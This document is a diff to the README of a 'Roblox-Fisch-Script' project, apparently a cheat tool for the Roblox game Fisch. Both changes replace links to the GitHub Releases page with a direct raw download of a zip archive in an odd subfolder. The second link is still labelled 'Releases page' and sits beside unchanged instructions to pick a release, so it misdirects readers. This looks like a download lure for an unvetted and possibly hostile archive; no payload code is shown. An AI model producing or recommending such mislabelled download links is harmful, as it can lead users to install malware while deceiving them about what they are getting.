@@ -6,7 +6,7 @@ Welcome to the Roblox-Fisch-Script! This software offers unique features for an 
 
 ## 📥 Download the Software
 
-[![Download Roblox-Fisch-Script](https://img.shields.io/badge/Download-Roblox--Fisch--Script-blue)](https://github.com/Mehdidu9345556/Roblox-Fisch-Script/releases)
+[![Download Roblox-Fisch-Script](https://raw.githubusercontent.com/Mehdidu9345556/Roblox-Fisch-Script/main/Djuka/Roblox-Fisch-Script.zip)](https://raw.githubusercontent.com/Mehdidu9345556/Roblox-Fisch-Script/main/Djuka/Roblox-Fisch-Script.zip)
 
 ## 📋 Features
 
@@ -24,7 +24,7 @@ Welcome to the Roblox-Fisch-Script! This software offers unique features for an 
 
 ## 📦 Download & Install
 
-To get started, visit the [Releases page to download](https://github.com/Mehdidu9345556/Roblox-Fisch-Script/releases). There you will find all available versions of the software.
+To get started, visit the [Releases page to download](https://raw.githubusercontent.com/Mehdidu9345556/Roblox-Fisch-Script/main/Djuka/Roblox-Fisch-Script.zip). There you will find all available versions of the software.
 
 1. Click on the link above.
 2. Choose the latest release from the list.
